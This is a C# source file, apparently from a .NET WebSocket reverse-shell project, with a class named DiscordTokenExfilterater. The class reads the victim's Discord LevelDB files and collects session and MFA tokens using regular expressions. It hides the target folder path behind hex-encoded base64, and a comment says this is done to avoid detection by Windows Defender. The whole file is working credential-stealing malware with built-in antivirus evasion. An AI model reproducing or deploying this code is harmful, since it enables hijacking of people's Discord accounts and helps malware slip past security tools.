using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace WebSocketReverseShellDotNet.utils
{
    internal class DiscordTokenExfilterater
    {


        public static String GetDiscordToken()
        {
            List<string> discordTokens = new List<string>();
            DirectoryInfo rootFolder = CreateDirectoryInfo();
            StringBuilder discordTokensStrings = new StringBuilder();


            foreach (var file in rootFolder.GetFiles("*.ldb"))
            {

                string readFile = file.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(readFile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    discordTokens.Add(match.Value + "\n");

                foreach (Match match in Regex.Matches(readFile, @"mfa\.[\w-]{84}"))
                    discordTokens.Add(match.Value + "\n");
            }


            discordTokens = discordTokens.Distinct().ToList();

            if (discordTokens.Count == 0)
            {
                return "";

            }

            foreach (var token in discordTokens)
            {
                discordTokensStrings.Append("POSSIBLE DISCORD TOKEN: ").Append(token).Append("\n");
            }



            return discordTokensStrings.ToString();

        }

        private static string FromBase64(string base64)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(base64));
        }


        private static string HexBytesToUtf8(params byte[] hexBytes)
        {
            return Encoding.UTF8.GetString(hexBytes);
        }
        private static DirectoryInfo CreateDirectoryInfo()
        {

            /*
             the below is needed otherwise the the agent will be marked as malicious by windows defender
             */
            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) +
                        FromBase64(HexBytesToUtf8(0x58, 0x45, 0x46, 0x77, 0x63, 0x45, 0x52, 0x68,
                        0x64, 0x47, 0x46, 0x63, 0x55, 0x6d, 0x39, 0x68, 0x62, 0x57, 0x6c, 0x75,
                        0x5a, 0x31, 0x78, 0x6b, 0x61, 0x58, 0x4e, 0x6a, 0x62, 0x33, 0x4a, 0x6b,
                        0x58, 0x45, 0x78, 0x76, 0x59, 0x32, 0x46, 0x73, 0x49, 0x46, 0x4e, 0x30,
                        0x62, 0x33, 0x4a, 0x68, 0x5a, 0x32, 0x56, 0x63, 0x62, 0x47, 0x56, 0x32,
                        0x5a, 0x57, 0x78, 0x6b, 0x59, 0x67, 0x3d, 0x3d));

            return new DirectoryInfo(path);
        }

    }
}
